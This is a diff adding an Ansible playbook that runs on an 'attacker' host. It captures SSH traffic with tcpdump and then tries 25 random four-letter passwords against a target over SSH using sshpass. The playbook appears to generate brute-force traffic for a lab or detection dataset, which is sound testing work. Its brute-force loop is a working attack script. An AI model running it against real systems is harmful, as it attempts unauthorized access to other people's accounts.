@@ -1,0 +1,40 @@
+---
+- hosts: attacker
+  become: yes
+  vars:
+    dummy_user: "DummyUser"
+    pcap_file: "/home/captureA_ssh.pcap"
+
+  tasks:
+    - name: Install tcpdump and sshpass
+      apt:
+        name:
+          - tcpdump
+          - sshpass
+        state: present
+        update_cache: yes
+
+    - name: Run tcpdump in background
+      shell: tcpdump -i eth0 -w {{ pcap_file }} tcp port 22 &
+      poll: 0
+
+    - name: Ensure SSH reachable
+      wait_for:
+        host: "{{ target_ip }}"
+        port: 22
+        timeout: 5
+      register: ssh_check
+      ignore_errors: yes
+
+    - name: Abort if SSH not reachable
+      fail:
+        msg: "Victim SSH not reachable. Aborting"
+      when: ssh_check is failed
+
+    - name: Brute force with random 4 letter passwords (25 attempts)
+      shell: |
+        for i in $(seq 1 25); do
+          PW=$(tr -dc 'a-z' </dev/urandom | head -c4)
+          sshpass -p "$PW" ssh -o ConnectTimeout=1 {{ dummy_user }}@{{ target_ip }} "exit" || true
+          sleep 0.1
+        done
